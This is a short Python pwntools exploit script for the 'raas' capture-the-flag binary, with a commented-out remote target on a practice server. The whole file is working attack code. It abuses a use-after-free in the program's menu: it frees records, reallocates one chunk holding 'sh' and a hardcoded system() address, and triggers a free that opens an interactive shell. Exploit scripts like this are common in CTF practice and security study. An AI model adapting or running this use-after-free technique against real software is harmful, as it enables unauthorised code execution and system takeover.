from pwn import *
context.log_level = "debug"

p = process( './raas' )
#p = remote( 'hackme.inndy.tw', 7719 )

def add_int( idx, value ):
	p.recvuntil( 'Act > ' )
	p.sendline( '1' )
	p.recvuntil( '> ' )
	p.sendline( str( idx ) )
	p.recvuntil( '> ' )
	p.sendline( '1' )
	p.recvuntil( '> ' )
	p.sendline( str( value ) )

def add_str( idx, len, val ):
	p.recvuntil( '> ' )
	p.sendline( '1' )
	p.recvuntil( '> ' )
	p.sendline( str( idx ) )
	p.recvuntil( '> ' )
	p.sendline( '2' )
	p.recvuntil( '> ' )
	p.sendline( str( len ) )
	p.recvuntil( '> ' )
	p.sendline( val )

def dele( idx ):
	p.recvuntil( '> ' )
	p.sendline( '2' )
	p.recvuntil( '> ' )
	p.sendline( str( idx ) )

def sho( idx ):
	p.recvuntil( '> ' )
	p.sendline( '3' )
	p.recvuntil( '> ' )
	p.sendline( str( idx ) )

entry = 0x08048540
system = 0x080484f0

add_int( 0, 0 ) #0
add_int( 1, 0 ) #1
add_int( 2, 0 ) #2
dele( 1 )
dele( 2 )
add_str( 3, 12, b'sh\x00\x00' +  p32( system ) ) #3
raw_input()
dele( 1 )

p.interactive()
